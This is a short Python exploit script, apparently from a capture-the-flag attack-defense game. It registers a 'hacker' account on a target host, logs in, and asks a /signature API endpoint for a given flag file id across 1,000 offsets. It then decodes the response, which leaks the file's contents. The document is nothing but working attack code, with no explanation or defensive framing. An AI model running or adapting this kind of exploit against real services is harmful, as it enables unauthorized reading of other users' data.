#!/usr/bin/env python3

import requests
import sys
import base64
from elftools.elf.elffile import ELFFile

host = sys.argv[1]
flagid = sys.argv[2]
port = 7001

url = f"http://{host}:{port}/api"

username = "hacker"
password = "hacker"

r = requests.post(f'{url}/register/', data={'username': username, 'password': password})

s = requests.Session()

s.post(f'{url}/login/', data={'username': username, 'password': password})

r = s.get(f'{url}/signature/', params={
    'fileId': flagid,
    'offsets': ','.join([str(i) for i in range(1000)]),
})

print(base64.b64decode(r.json()['result'].encode()))